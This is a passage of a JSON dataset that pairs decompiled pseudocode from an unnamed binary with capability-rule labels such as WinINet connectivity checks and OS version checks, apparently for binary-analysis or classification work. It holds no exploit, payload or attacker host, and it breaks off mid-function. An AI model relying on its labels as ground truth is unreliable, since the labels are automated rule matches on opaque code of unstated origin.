            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00021a18(void)\n\n{\n    uint uVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    \n    if (*0x64290 == 0xffffffff) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0002074c(*0x64290, 0);\n        *0x64290 = 0xffffffff;\n    }\n    fcn.0002f23c(0x88cc0);\n    iVar3 = 0;\n    piVar2 = 0x88cd0;\n    do {\n        if (*piVar2 != 0) break;\n        piVar2 = piVar2 + 1;\n        iVar3 = iVar3 + 1;\n    } while (piVar2 < 0x88d20);\n    fcn.0002f2a4(0x88cc0);\n    if (9 < iVar3) {\n        fcn.0002f214(0x88cc0);\n        *0x88cc8 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 243
    },
    "00021b00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00021b00(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint64_t uVar8;\n    uint32_t in_stack_00000028;\n    uint *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uchar auStack136 [16];\n    int32_t iStack120;\n    uint32_t uStack116;\n    uint32_t uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    \n    puVar1 = in_stack_00000038;\n    uVar8 = arg2;\n    if (in_stack_00000038 == NULL) {\n        return 0xffffffff;\n    }\n    uVar4 = fcn.00020640(&stack0x00000038, arg1, 1, auStack136);\n    if (uVar4 != 0) {\n        return uVar4;\n    }\n    if ((in_stack_00000038[0x24] != 0) && (arg2 == in_stack_00000038[0x25])) {\n        uVar8 = in_stack_00000038[0x26];\n    }\n    iVar7 = uVar8;\n    if (*(in_stack_00000038 + 10) != '\\0') {\n        for (piVar5 = *(in_stack_00000038 + 0xe); (piVar5 != NULL && ((*piVar5 != iVar7 || (piVar5[1] != arg3))));\n            piVar5 = *(piVar5 + 8)) {\n        }\n        iVar2 = 0;\n        if (piVar5 != NULL) {\n            for (iVar6 = *(piVar5 + 4); iVar6 != 0; iVar6 = *(iVar6 + 0x18)) {\n                iVar2 = iVar2 + 0x40 + *(iVar6 + 4);\n            }\n        }\n        if (in_stack_00000038[4] * *(in_stack_00000038 + 10) < (iVar2 + in_stack_00000028) * 100) {\n            uVar8 = 7;\n            goto code_r0x00021caf;\n        }\n    }\n    fcn.00061a56();\n    iStack120 = iVar7;\n    uStack108 = arg4;\n    uStack88 = fcn.00030130(0);\n    uStack84 = 0;\n    uStack80 = 0;\n    if (in_stack_00000030 != NULL) {\n        uStack104 = *in_stack_00000030;\n        uStack100 = in_stack_00000030[1];\n        uStack96 = in_stack_00000030[2];\n        uStack92 = in_stack_00000030[3];\n    }\n    for (piVar5 = *(in_stack_00000038 + 0xe); (piVar5 != NULL && ((*piVar5 != iVar7 || (piVar5[1] != arg3))));\n        piVar5 = *(piVar5 + 8)) {\n    }\n    if (piVar5 == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = piVar5[3];\n    }\n    uStack116 = iVar2 + 1;\n    *puVar1 = uStack116;\n    uStack112 = arg3;\n    iVar2 = fcn.000216e8(in_stack_00000038, &iStack120);\n    if (iVar2 == -1) {\n        uVar8 = 4;\n    }\n    else {\n        uVar3 = fcn.0001fee4(in_stack_00000038, uVar8, arg3, *puVar1);\n        uVar8 = uVar3;\n        for (piVar5 = *(in_stack_00000038 + 0xe); (piVar5 != NULL && ((*piVar5 != iVar7 || (piVar5[1] != arg3))));\n            piVar5 = *(piVar5 + 8)) {\n        }\n        fcn.0001fe7c(piVar5);\n    }\ncode_r0x00021caf:\n    fcn.0001feb8(auStack136);\n    return uVar8;\n}\n",
        "token_count": 1010
    },
    "00021e34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00021e34(char *arg1, ulong arg2, int32_t *arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char cVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint32_t uVar7;\n    char *arg1_00;\n    uint32_t *arg1_01;\n    int64_t iVar8;\n    uint64_t uVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    uint32_t *puVar12;\n    int64_t *piVar13;\n    int64_t *piVar14;\n    uchar auStack344 [280];\n    \n    arg1_01 = NULL;\n    bVar4 = false;\n    bVar6 = false;\n    if ((arg1 == NULL) || (arg3 == NULL)) {\n        return -1;\n    }\n    if (*0x88cc8 == 0) {\n        fcn.00061a56(0x88cc0, 0, 0x60);\n        fcn.0002f1ec(0x88cc0);\n        *0x88cc8 = 1;\n    }\n    arg1_00 = fcn.0002fbc4(0x104);\n    if (arg1_00 == NULL) {\n        return 2;\n    }\n    pcVar10 = arg1;\n    do {\n        cVar2 = *pcVar10;\n        pcVar10[arg1_00 - arg1] = cVar2;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar2 != '\\0');\n    fcn.0002f23c(0x88cc0);\n    piVar14 = 0x88cd0;\n    bVar5 = true;\n    *arg3 = -1;\n    piVar13 = 0x88cd0;\n    puVar12 = arg1_01;\n    do {\n        iVar11 = puVar12;\n        if (*piVar13 == 0) {\n            *arg3 = iVar11;\n        }\n        else {\n            pcVar10 = arg1_00;\n            do {\n                cVar2 = *pcVar10;\n                cVar3 = pcVar10[*(*piVar13 + 0x50) - arg1_00];\n                if (cVar2 != cVar3) break;\n                pcVar10 = pcVar10 + 1;\n            } while (cVar3 != '\\0');\n            if (cVar2 == cVar3) {\n                fcn.0002fc50(arg1_00);\n                *arg3 = iVar11;\n                piVar1 = *(puVar12 * 8 + 0x88cd0) + 4;\n                *piVar1 = *piVar1 + 1;\n                iVar11 = 0;\n                bVar4 = false;\n                goto code_r0x00022233;\n            }\n        }\n        puVar12 = iVar11 + 1U;\n        piVar13 = piVar13 + 1;\n    } while (iVar11 + 1U < 10);\n    if (*arg3 == -1) {\n        iVar11 = -1;\n        bVar4 = false;\n    }\n    else {\n        arg1_01 = fcn.0002fbc4(0xa0);\n        if (arg1_01 == NULL) {\n            iVar11 = -1;\n        }\n        else {\n            fcn.00061a56(arg1_01, 0, 0xa0);\n            *(arg1_01 + 0x14) = arg1_00;\n            *(arg1_01 + 0x16) = arg4;\n            iVar8 = (**(arg4 + 8))(arg1, 0);\n            *(arg1_01 + 0x18) = iVar8;\n            if (iVar8 == 0) {\n                iVar11 = 3;\n            }\n            else {\n                arg1_01[1] = 1;\n                iVar11 = (**(*(arg1_01 + 0x16) + 0x28))(iVar8, arg1_01 + 2, 0x2c);\n                bVar4 = false;\n                while( true ) {\n                    if (((iVar11 != 0) ||\n                        (uVar7 = (**(*(arg1_01 + 0x16) + 0x20))(*(arg1_01 + 0x18)),  uVar7 == 0xffffffff)) ||\n                       (uVar7 < 0x2c)) goto code_r0x00022227;\n                    if ((arg1_01[2] != uVar7) && (arg1_01[2] = uVar7,  bVar4)) {\n                        arg1_01[0xb] = arg1_01[0xb] + 1;\n                        iVar11 = (**(*(arg1_01 + 0x16) + 0x30))(*(arg1_01 + 0x18), arg1_01 + 2, 0x2c, 0);\n                        if (iVar11 != 0) goto code_r0x00022227;\n                    }\n                    uVar7 = arg1_01[3];\n                    if (((0x40000000 < uVar7) || (0x40000000 < arg1_01[4])) ||\n                       ((arg1_01[4] <= uVar7 && uVar7 != arg1_01[4] ||\n                        ((0x20000000 < arg1_01[5] ||\n                         (uVar7 = uVar7 + arg1_01[5],  arg1_01[4] <= uVar7 && uVar7 != arg1_01[4]))))))\n                    goto code_r0x00022227;\n                    if (bVar4) break;\n                    if ((arg1_01[0xc] == 0) || (arg1_01[0xc] == 0xcccccccc)) {\n                        uVar7 = fcn.0001fd3c(arg1_00);\n                        arg1_01[0xc] = uVar7;\n                        iVar11 = (**(*(arg1_01 + 0x16) + 0x30))(*(arg1_01 + 0x18), arg1_01 + 2, 0x2c, 0);\n                        if (iVar11 != 0) goto code_r0x00022227;\n                    }\n                    fcn.00061a56(auStack344, 0, 0x104);\n                    fcn.0001fd08(auStack344, 0x103, 0x11e50, 0x11e58);\n                    iVar11 = fcn.0002f2b0(arg1_01 + 0x22, auStack344);\n                    if ((iVar11 != 0) && (iVar11 = fcn.0002f388(arg1_01 + 0x22, auStack344),  iVar11 != 0)) {\n                        iVar11 = -1;\n                        goto code_r0x0002222c;\n                    }\n                    fcn.0002f2a4(0x88cc0);\n                    bVar5 = false;\n                    fcn.0002f448(arg1_01 + 0x22);\n                    bVar4 = true;\n                    iVar11 = (**(*(arg1_01 + 0x16) + 0x28))(*(arg1_01 + 0x18));\n                }\n                (**(*(arg1_01 + 0x16) + 0x38))(*(arg1_01 + 0x18), 2);\n                iVar11 = fcn.00020184(arg1_01);\n                if (iVar11 != 0) goto code_r0x0002222c;\n                bVar6 = true;\n                arg1_01[9] = 1;\n                iVar11 = (**(*(arg1_01 + 0x16) + 0x30))(*(arg1_01 + 0x18), arg1_01 + 2, 0x2c, 0);\n                if (iVar11 == 0) {\n                    if (-1 < arg2) {\n                        fcn.00020860(*arg1_01);\n                    }\n                    arg1_01[0x1a] = arg2;\n                    if ((0 < arg2) && (iVar11 = fcn.0002ed80(arg1_01 + 0x1c),  iVar11 != 0)) {\n                        fcn.0001a650(arg1_01 + 0x1e, 0x21ac8, arg1_01);\n                    }\n                    fcn.0002f23c(0x88cc0);\n                    *arg3 = -1;\n                    uVar9 = 0;\n                    goto code_r0x00022202;\n                }\ncode_r0x00022227:\n                iVar11 = 3;\ncode_r0x0002222c:\n                if (!bVar5) goto code_r0x0002223f;\n            }\n        }\n    }\n    goto code_r0x00022233;\n    while( true ) {\n        uVar7 = uVar9 + 1;\n        uVar9 = uVar7;\n        piVar14 = piVar14 + 1;\n        if (9 < uVar7) break;\ncode_r0x00022202:\n        if (*piVar14 == 0) {\n            *arg3 = uVar9;\n            *(uVar9 * 8 + 0x88cd0) = arg1_01;\n            iVar11 = 0;\n            goto code_r0x00022233;\n        }\n    }\n    iVar11 = -1;\ncode_r0x00022233:\n    fcn.0002f2a4(0x88cc0);\ncode_r0x0002223f:\n    if ((arg1_01 != NULL) && (*(arg1_01 + 0x18) != 0)) {\n        (**(*(arg1_01 + 0x16) + 0x38))(*(arg1_01 + 0x18), 1);\n    }\n    if (bVar4) {\n        fcn.0002f458(arg1_01 + 0x22);\n    }\n    if (iVar11 != 0) {\n        if (bVar6) {\n            fcn.0001fd9c(arg1_01);\n        }\n        if (arg1_01 != NULL) {\n            if (*(arg1_01 + 0x18) != 0) {\n                (**(*(arg1_01 + 0x16) + 0x10))();\n            }\n            if (bVar4) {\n                fcn.0002f440(arg1_01 + 0x22);\n            }\n            fcn.0002fc50(arg1_01);\n        }\n        fcn.0002fc50(arg1_00);\n    }\n    return iVar11;\n}\n",
        "token_count": 2407
    },
    "0002233c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0002233c(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    \n    fcn.0001609c();\n    uVar2 = 0;\n    piVar3 = 0x7a2e0;\n    do {\n        if (*piVar3 != 0) {\n            fcn.000608c8(uVar2 * 8 + 0x7a2e0, 0);\n        }\n        uVar1 = uVar2 + 1;\n        uVar2 = uVar1;\n        piVar3 = piVar3 + 1;\n    } while (uVar1 < 10);\n    return;\n}\n",
        "token_count": 160
    },
    "000226cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000226cc(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x7a350 != 0) {\n        fcn.00026e2c(10, 0, 0, 0);\n        *0x88b70 = 1;\n        iVar1 = fcn.0002eec4(0x88b88);\n        if (iVar1 != 0) {\n            fcn.0002ee20(0x88b88);\n            if (*0x88b58 != 0) {\n                fcn.000608c8(0x88b58, 0);\n            }\n            fcn.0002ee4c(0x88b60, 0xffffffff);\n            fcn.00031624(0x7a2d0);\n            fcn.0002edfc(0x88b88);\n            fcn.0002edfc(0x88b60);\n        }\n        iVar1 = fcn.0002eec4(0x88b68);\n        if (iVar1 != 0) {\n            fcn.0002ee20(0x88b68);\n            fcn.0002ee4c(0x88ca8, 0xffffffff);\n            fcn.00031624(0x7a330);\n            fcn.0002edfc(0x88b68);\n            fcn.0002edfc(0x88ca8);\n        }\n        iVar1 = fcn.0002eec4(*0x88cb0);\n        if (iVar1 != 0) {\n            iVar1 = fcn.0002eec4(0x88b78);\n            if (iVar1 != 0) {\n                fcn.0002ee20(*0x88cb0);\n                fcn.0002ee4c(0x88b78, 0xffffffff);\n                fcn.00031624(0x7a340);\n                fcn.0002edfc(0x88b78);\n            }\n        }\n        fcn.0002233c();\n        fcn.00029844();\n        fcn.00027b6c();\n        fcn.000247fc();\n        fcn.0001609c();\n        fcn.0005f8fc();\n        fcn.000294bc(0xfffffffe);\n        fcn.00029824();\n        fcn.00026e2c(0xb, 0, 0, 0);\n        fcn.00021a18();\n        *0x7a350 = 0;\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "00022868": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00022868(ulong arg1, char *arg2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int64_t iVar7;\n    ulong auStackX24 [2];\n    int64_t iStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    \n    iVar3 = fcn.0002fc74(arg1);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    puVar4 = fcn.00061a86(iVar3, 0x2f);\n    if (puVar4 == NULL) {\n        fcn.0002fc50(iVar3);\n        return 0;\n    }\n    *puVar4 = 0;\n    iVar7 = -1;\n    uStack64 = 0;\n    pcVar5 = puVar4 + 1;\n    do {\n        if (iVar7 == 0) break;\n        iVar7 = iVar7 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iStack72 = iVar3;\n    uVar2 = fcn.00060b2c(auStackX24, &iStack72, puVar4 + 1, ~iVar7);\n    fcn.0002fc50(iVar3);\n    if (uVar2 != 0) {\n        fcn.00026e2c(8, 0, uVar2, 0);\n        return 0;\n    }\n    if (arg2 != NULL) {\n        iVar3 = -1;\n        pcVar5 = arg2;\n        do {\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        iVar3 = ~iVar3 + 1;\n        pcVar5 = fcn.0002fbc4(iVar3);\n        if (pcVar5 == NULL) goto code_r0x0002293e;\n        iVar7 = pcVar5 - arg2;\n        do {\n            cVar1 = *arg2;\n            arg2[iVar7] = cVar1;\n            arg2 = arg2 + 1;\n        } while (cVar1 != '\\0');\n        pcVar5[iVar3 + -1] = '\\0';\n        cVar1 = *pcVar5;\n        pcVar6 = pcVar5;\n        while (cVar1 != '\\0') {\n            if (*pcVar6 == ',') {\n                *pcVar6 = '\\0';\n            }\n            pcVar6 = pcVar6 + 1;\n            cVar1 = *pcVar6;\n        }\n        uVar2 = fcn.00060e18(auStackX24[0], pcVar5, 0);\n        if (uVar2 != 0) {\n            fcn.00026e2c(8, 0, uVar2, 0);\n            fcn.0002fc50(pcVar5);\n            goto code_r0x0002293e;\n        }\n        fcn.0002fc50(pcVar5);\n    }\n    uStack48 = 0;\n    uStack40 = 0;\n    uStack56 = 0x224b0;\n    fcn.00060e90(auStackX24[0], 2, &uStack56, 0x18);\n    fcn.00060e90(auStackX24[0], 5, 0x224d4, 0);\n    uVar2 = fcn.00060f4c(auStackX24[0], 0x2237c, 0, 0);\n    if (uVar2 == 0) {\n        return auStackX24[0];\n    }\n    fcn.00026e2c(8, 0, uVar2, 0);\ncode_r0x0002293e:\n    fcn.000608c8(auStackX24, 0);\n    return 0;\n}\n",
        "token_count": 947
    },
    "0002331c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0002331c(ulong arg1, uint64_t arg2, ulong arg3, uint64_t arg4)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint64_t *arg1_00;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    char cStack64;\n    uint uStack63;\n    uint uStack59;\n    uint uStack55;\n    \n    arg2 = arg2 & 0xffffffff;\n    bVar1 = false;\n    arg1_00 = fcn.0002fbc4(arg3);\n    uVar4 = arg4 & 0xffffffff;\n    if (arg1_00 == NULL) {\n        uVar5 = 0x21590004;\n    }\n    else {\n        uVar2 = fcn.00026a7c(2, 0);\n        if (uVar2 < uVar4) {\n            iVar3 = fcn.000218cc(arg1, 0, arg2, 0);\n            if (iVar3 == 0) {\n                if (0x14 < arg3) {\n                    uStack72 = *arg1_00;\n                    uVar5 = arg1_00[1];\n                    cStack64 = uVar5;\n                    uStack63 = uVar5 >> 8;\n                    uStack55 = CONCAT13(*(arg1_00 + 0x14), *(arg1_00 + 2) >> 8);\n                    uVar2 = fcn.0002fcf4(uStack72 & 0xffffffff);\n                    uVar5 = uStack72 >> 0x20;\n                    uStack72 = uStack72 & 0xffffffff00000000 | uVar2;\n                    uVar2 = fcn.0002fcf4(uVar5);\n                    uStack72 = uStack72 & 0xffffffff | uVar2 << 0x20;\n                    uStack59 = fcn.0002fcf4(uStack59);\n                    if (uVar4 == uStack72._4_4_) {\n                        uStack104 = 0x642a0;\n                        if ((cStack64 == '\\x02') || (cStack64 == '\\x01')) {\n                            bVar1 = true;\n                            fcn.0002191c(arg1, 0, arg2);\n                        }\n                        uStack88 = 0;\n                        uStack80 = 0;\n                        fcn.000262e4(&uStack104, uStack72 & 0xffffffff, arg1_00 + 0x15, arg3 - 0x15);\n                        if (bVar1) {\n                            iVar3 = fcn.0002eec4(&uStack88);\n                            if (iVar3 != 0) {\n                                uStack96 = 36000000000;\n                                iVar3 = fcn.00061aa4();\n                                if (iVar3 == 0x102) {\n                                    fcn.00026e2c(0xc, 0, 0x21590002, uStack72 & 0xffffffff);\n                                }\n                                fcn.00031624(&uStack88);\n                            }\n                        }\n                        fcn.0002fc50(0);\n                        fcn.00026ad8(2, arg4 & 0xffffffff);\n                        goto code_r0x0002352b;\n                    }\n                }\n                uVar5 = 0x21590064;\n            }\n            else {\n                uVar5 = iVar3 + 0x191U | 0x21590000;\n            }\n        }\n        else {\n            uVar5 = 0x215901f7;\n        }\n    }\n    fcn.00026e2c(3, 0, uVar5, 0);\ncode_r0x0002352b:\n    fcn.0002fc50(arg1_00);\n    if (!bVar1) {\n        fcn.0002191c(arg1, 0, arg2);\n    }\n    return;\n}\n",
        "token_count": 908
    },
    "00023698": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00023698(ulong *arg1, ulong arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    ulong arg1_00;\n    int64_t iVar7;\n    int64_t iVar8;\n    char *pcVar9;\n    uchar auStackX16 [24];\n    uchar *puStack440;\n    ulong uStack432;\n    uchar auStack424 [128];\n    char acStack296 [256];\n    \n    arg1_00 = 200;\n    if (arg2 != 0) {\n        arg1_00 = 300;\n    }\n    iVar2 = fcn.00026a7c(arg1_00, 0);\n    if (iVar2 != 0) {\n        iVar3 = fcn.00061a9e();\n        iVar3 = iVar3 % iVar2;\n        uVar6 = iVar3 + 0xc9;\n        if (arg2 != 0) {\n            uVar6 = iVar3 + 0x12d;\n        }\n        iVar2 = fcn.00026a28(uVar6, auStack424, 0x80, auStackX16);\n        if (iVar2 != 0) {\n            return iVar2 + 0x191U | 0x21590000;\n        }\n        acStack296[0] = '\\0';\n        uVar6 = iVar3 + 0xd4;\n        if (arg2 != 0) {\n            uVar6 = iVar3 + 0x138;\n        }\n        fcn.00026a28(uVar6, acStack296, 0x100, auStackX16);\n        puVar4 = fcn.00061a86(auStack424, 0x2f);\n        if (puVar4 != NULL) {\n            *puVar4 = 0;\n            puStack440 = auStack424;\n            iVar8 = -1;\n            uStack432 = 0;\n            iVar7 = iVar8;\n            pcVar5 = puVar4 + 1;\n            do {\n                if (iVar7 == 0) break;\n                iVar7 = iVar7 + -1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar6 = fcn.00060ca8(arg1, &puStack440, puVar4 + 1, ~iVar7);\n            if (uVar6 != 0) {\n                fcn.00026e2c(1, 0, uVar6, 0);\n                return uVar6;\n            }\n            if (acStack296[0] != '\\0') {\n                pcVar5 = acStack296;\n                do {\n                    if (iVar8 == 0) break;\n                    iVar8 = iVar8 + -1;\n                    cVar1 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                } while (cVar1 != '\\0');\n                iVar8 = ~iVar8 + 1;\n                pcVar5 = fcn.0002fbc4(iVar8);\n                if (pcVar5 == NULL) {\n                    fcn.000608c8(arg1, 0);\n                    return 0x21590004;\n                }\n                pcVar9 = acStack296;\n                do {\n                    cVar1 = *pcVar9;\n                    pcVar9[pcVar5 - acStack296] = cVar1;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar1 != '\\0');\n                pcVar5[iVar8 + -1] = '\\0';\n                cVar1 = *pcVar5;\n                pcVar9 = pcVar5;\n                while (cVar1 != '\\0') {\n                    if (*pcVar9 == ',') {\n                        *pcVar9 = '\\0';\n                    }\n                    pcVar9 = pcVar9 + 1;\n                    cVar1 = *pcVar9;\n                }\n                uVar6 = fcn.00060e18(*arg1, pcVar5, 0);\n                if (uVar6 != 0) {\n                    fcn.0002fc50(pcVar5);\n                    fcn.000608c8(arg1, 0);\n                    fcn.00026e2c(1, 0, uVar6, 0);\n                    return uVar6;\n                }\n                fcn.0002fc50(pcVar5);\n            }\n            if (arg3 != NULL) {\n                *arg3 = iVar3 + 1000000000;\n            }\n            return 0;\n        }\n    }\n    return 0x21590064;\n}\n",
        "token_count": 1050
    },
    "000238c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000238c0(void)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t arg4;\n    uint64_t uVar10;\n    uint64_t arg4_00;\n    uint32_t uStackX8;\n    uint32_t uStackX16;\n    int32_t aiStackX24 [2];\n    uint32_t auStackX32 [2];\n    uint auStack264 [2];\n    int64_t iStack256;\n    ulong uStack248;\n    uint32_t auStack240 [2];\n    uint32_t uStack232;\n    uint32_t uStack228;\n    uchar uStack224;\n    uint32_t uStack219;\n    uint32_t uStack211;\n    uint uStack207;\n    uint32_t uStack203;\n    uint8_t uStack199;\n    uint32_t uStack198;\n    int32_t iStack194;\n    uint uStack190;\n    uint uStack186;\n    uchar auStack136 [4];\n    uint32_t uStack132;\n    uint32_t uStack124;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    \n    uVar10 = 0;\n    uStackX16 = 0;\n    auStack264[0] = 0;\n    *0x88b58 = 0;\n    do {\n        iStack256 = 0;\n        bVar1 = false;\n        fcn.00061a56();\n        uVar4 = fcn.00026a7c(1, 0);\n        fcn.00026a7c(400, 20000);\n        uVar5 = fcn.00026a7c(0xe1, 0x1000);\n        uVar6 = fcn.00026a7c(0xe2, 0x10000);\n        uStack199 = 1;\n        iVar7 = fcn.00026a7c(2, 0);\n        arg4 = 0;\n        uStack203 = iVar7 + 1;\n        arg4_00 = 0;\n        while (iVar7 = fcn.00021828(uVar4, 0, 0, auStack136),  iVar7 == 0) {\n            if (uStack88 < uStack92) {\n                arg4 = uStack124;\n                uStack199 = 0;\n                iStack194 = uStack92 - uStack88;\n                uStack198 = uStack88;\n                bVar1 = true;\n                uStack203 = uStack124;\n                arg4_00 = uStack88;\n                uVar10 = uStack92;\n                uStackX16 = uStack132;\n                break;\n            }\n            fcn.0002331c(uVar4, uStack132, uStack92, uStack124);\n        }\n        iVar7 = arg4_00;\n        if ((*0x88b58 == 0) && (iVar8 = fcn.00023698(0x88b58, 0, auStack264),  iVar8 != 0)) goto code_r0x00023d88;\n        uStack199 = uStack199 | 0x1a;\n        uStack228 = uVar4 | 0x80000000;\n        uStack224 = 1;\n        uStack207 = 0;\n        uStack211 = uVar4;\n        uStack190 = uVar5;\n        uStack186 = uVar6;\n        uStack232 = fcn.0002fcf4(uStack232);\n        uStack228 = fcn.0002fcf4(uStack228);\n        uStack219 = fcn.0002fcf4(uStack219);\n        fcn.00024778(&uStack211);\n        uVar9 = fcn.000610c8(*0x88b58, 0xb, &uStack232, 0x52);\n        if (uVar9 != 0) {\n            fcn.00026e2c(2, 0, uVar9, 0);\n            goto code_r0x00023d88;\n        }\n        iVar8 = fcn.0006115c(*0x88b58, uStackX8, &iStack256, auStack240);\n        if (iVar8 == 0) {\n            if (auStack240[0] < 0x40) {\n                uVar10 = 0x215901f5;\ncode_r0x00023d47:\n                fcn.00026e2c(2, 0, uVar10, 0);\n            }\n            else {\n                fcn.0002328c(iStack256);\n                if (*(iStack256 + 0x2c) <= *(iStack256 + 0x30)) {\n                    if (!bVar1) {\n                        arg4 = *(iStack256 + 0xc);\n                        uVar10 = *(iStack256 + 0x2c);\n                        iVar7 = fcn.00021dec(uVar4, 0, *(iStack256 + 0xc), uVar10);\n                        if (iVar7 != 0) {\n                            uVar10 = iVar7 + 0x191U | 0x21590000;\n                            goto code_r0x00023d47;\n                        }\n                    }\n                    while( true ) {\n                        iVar7 = arg4_00;\n                        uVar9 = fcn.0006115c(*0x88b58, uStackX8, &uStack248, aiStackX24);\n                        if (uVar9 != 0) break;\n                        if (aiStackX24[0] == 0) goto code_r0x00023bec;\n                        iVar8 = fcn.00021888(uVar4, 0, uStackX16, arg4_00);\n                        fcn.000609a8(*0x88b58, uStack248);\n                        if (iVar8 != 0) break;\n                        arg4_00 = iVar7 + aiStackX24[0];\n                    }\n                    fcn.00026e2c(2, 0, uVar9, 0);\n                    goto code_r0x00023bec;\n                }\n            }\n            fcn.00061384(*0x88b58, uStackX8);\n            goto code_r0x00023d88;\n        }\ncode_r0x00023bec:\n        bVar2 = false;\n        bVar3 = false;\n        uVar9 = fcn.000612a8(*0x88b58, uStackX8, auStackX32, &uStack248);\n        if (uVar9 == 0) {\n            if (auStackX32[0] == 0) {\n                if (iVar7 == uVar10) {\n                    fcn.0002331c(uVar4, uStackX16, uVar10, arg4);\n                    bVar2 = true;\n                }\n                else {\n                    fcn.00026e2c(2, 0, 0x215901f6, 0);\n                    fcn.0002191c(uVar4, 0, uStackX16);\n                }\n            }\n            else {\n                bVar2 = bVar3;\n                if (auStackX32[0] == 0x21590196) {\n                    if (bVar1) {\n                        fcn.0002191c(uVar4, 0, uStackX16);\n                        fcn.00026e2c(2, 0, auStackX32[0], 0);\n                        if (auStackX32[0] != 0x21590196) goto code_r0x00023ccc;\n                    }\n                }\n                else {\ncode_r0x00023ccc:\n                    if (auStackX32[0] != 0x21590192) {\n                        fcn.00026e2c(2, 0, auStackX32[0], 0);\n                    }\n                }\n            }\n            fcn.000609a8(*0x88b58, uStack248);\n        }\n        else {\n            fcn.00026e2c(2, 0, uVar9, 0);\n        }\n        fcn.000609a8(*0x88b58, iStack256);\n        iStack256 = 0;\n        if (!bVar2) {\ncode_r0x00023d88:\n            if (*0x88b58 != 0) {\n                fcn.000609a8(*0x88b58, iStack256);\n                fcn.000608c8(0x88b58, 0);\n            }\n   